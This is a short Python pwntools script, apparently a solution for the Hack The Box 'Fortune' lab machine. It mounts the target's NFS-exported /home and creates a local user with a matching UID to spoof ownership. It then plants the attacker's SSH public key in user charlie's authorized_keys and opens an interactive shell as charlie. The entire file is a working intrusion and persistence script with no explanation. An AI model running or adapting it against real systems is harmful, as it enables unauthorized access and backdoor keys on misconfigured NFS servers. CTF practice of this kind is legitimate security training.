#!/usr/bin/env python2

import os

from pwn import *

root_key = "/root/.ssh/id_rsa.pub"
key = "/tmp/key.pub"
share = "/tmp/fortune"

nfsuser = ssh(host="fortune.htb", user="nfsuser", keyfile="/root/Downloads/fortune/nfsuser_rsa")

os.system("mkdir -p /tmp/fortune")
os.system("mount -t nfs fortune.htb:/home " + share)
os.system("cp " + root_key + " " + key)
os.system("chmod 777 " + key)
os.system("useradd frank -u 1000")
os.system("sudo -u frank cp " + key + " " + share + "/charlie/.ssh/authorized_keys")
nfsuser.close()
os.system("userdel frank")
os.system("rm " + key)
os.system("umount -f " + share)

charlie = ssh(host="fortune.htb", user="charlie", keyfile="/root/.ssh/id_rsa")
charlie.interactive()
